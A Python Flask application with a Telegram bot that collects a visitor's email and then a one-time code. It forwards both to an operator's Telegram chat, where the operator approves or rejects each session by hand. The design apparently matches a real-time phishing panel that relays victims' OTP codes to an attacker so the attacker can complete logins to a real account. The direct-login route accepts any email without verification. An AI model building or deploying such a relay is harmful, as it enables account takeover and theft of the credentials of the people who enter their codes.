import os
import threading
import uuid
from flask import Flask, request, jsonify, render_template
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789)) 

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

sessions = {}
admin_msg_to_session = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/direct-login', methods=['POST'])
def direct_login():
    data = request.json
    email = data.get('email')
    if not email: return jsonify({"error": "Email required"}), 400
    return jsonify({"success": True, "email": email})

@app.route('/api/request-otp', methods=['POST'])
def request_otp():
    data = request.json
    email = data.get('email')
    if not email: return jsonify({"error": "Email required"}), 400
    
    session_id = str(uuid.uuid4())
    sessions[session_id] = {'email': email, 'admin_otp': None, 'user_otp': None, 'status': 'pending_admin_otp'}
    
    try:
        msg = bot.send_message(ADMIN_ID, f"🔔 *New Login Request*\n\nUser: `{email}`\n\nReply with OTP.", parse_mode='Markdown')
        admin_msg_to_session[msg.message_id] = session_id
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return jsonify({"session_id": session_id})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    session_id = data.get('session_id')
    user_otp = data.get('otp')
    if session_id not in sessions: return jsonify({"error": "Invalid session"}), 400
    
    sessions[session_id]['user_otp'] = user_otp
    sessions[session_id]['status'] = 'pending_admin_confirm'
    email = sessions[session_id]['email']
    admin_otp = sessions[session_id]['admin_otp']
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{session_id}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_{session_id}"))
    
    try:
        bot.send_message(ADMIN_ID, f"🔐 *OTP Verification*\n\nUser: `{email}`\nAdmin OTP: `{admin_otp}`\nUser OTP: `{user_otp}`", reply_markup=markup, parse_mode='Markdown')
    except Exception as e: return jsonify({"error": str(e)}), 500
    return jsonify({"message": "Sent"})

@app.route('/api/check-status/<session_id>', methods=['GET'])
def check_status(session_id):
    if session_id not in sessions: return jsonify({"error": "Invalid"}), 400
    return jsonify({"status": sessions[session_id]['status']})

@bot.message_handler(func=lambda message: message.reply_to_message is not None and message.chat.id == ADMIN_ID)
def handle_admin_otp(message):
    replied_id = message.reply_to_message.message_id
    if replied_id in admin_msg_to_session:
        session_id = admin_msg_to_session[replied_id]
        if session_id in sessions:
            sessions[session_id]['admin_otp'] = message.text.strip()
            sessions[session_id]['status'] = 'pending_user_otp'
            bot.reply_to(message, f"✅ OTP set. Waiting for user.")

@bot.callback_query_handler(func=lambda call: True)
def handle_admin_decision(call):
    action, session_id = call.data.split('_', 1)
    if session_id in sessions:
        if action == "confirm":
            sessions[session_id]['status'] = 'approved'
            bot.edit_message_text("✅ Approved.", call.message.chat.id, call.message.message_id)
        else:
            sessions[session_id]['status'] = 'rejected'
            bot.edit_message_text("❌ Rejected.", call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

def run_bot(): bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
